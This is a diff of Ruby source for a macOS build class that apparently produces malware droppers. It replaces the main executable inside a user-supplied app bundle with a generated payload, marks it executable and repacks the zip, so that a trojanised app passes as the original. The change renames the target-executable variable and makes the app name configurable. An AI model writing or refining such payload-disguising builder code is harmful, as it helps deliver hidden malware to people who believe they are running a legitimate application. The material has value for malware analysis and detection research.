@@ -74,7 +74,7 @@ class BuildOSX < Build
 
     # TODO: make the default exe an actual default app
     executable = path('default')
-    @executable_name = 'install'
+    @appname = params['appname'] || 'install'
 
     # the user has provided a file to melt with
     if params and params['input']
@@ -97,7 +97,7 @@ class BuildOSX < Build
           if f.name["MacOS/#{exe}"]
             z.extract(f, path('exe'))
             executable = path('exe')
-            @executable_name = f.name
+            @appname = f.name
           end
         end
       end
@@ -117,9 +117,7 @@ class BuildOSX < Build
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
-    @outputs << 'output'
-
-
+    @outputs = ['output']
 
   end
 
@@ -128,11 +126,11 @@ class BuildOSX < Build
 
     # substitute the exec into the app
     if File.exist? path('input')
-      trace :debug, "Build: pack: repacking the app with [#{@executable_name}]"
+      trace :debug, "Build: pack: repacking the app with [#{@appname}]"
 
       Zip::ZipFile.open(path('input')) do |z|
-        z.file.open(@executable_name, 'w') {|f| f.write File.open(path('output'), 'rb') {|f| f.read} }
-        z.file.chmod(0755, @executable_name)
+        z.file.open(@appname, 'w') {|f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+        z.file.chmod(0755, @appname)
       end
 
       FileUtils.mv(path('input'), path('output.zip'))
@@ -144,12 +142,12 @@ class BuildOSX < Build
     end
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@executable_name, "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
-      z.file.chmod(0755, @executable_name)
+      z.file.open(@appname, "w") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      z.file.chmod(0755, @appname)
     end
 
     # TODO: remove this when the correct method has been found
-    #binary_patch_exec_bit('output.zip', @executable_name)
+    #binary_patch_exec_bit('output.zip', @appname)
 
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
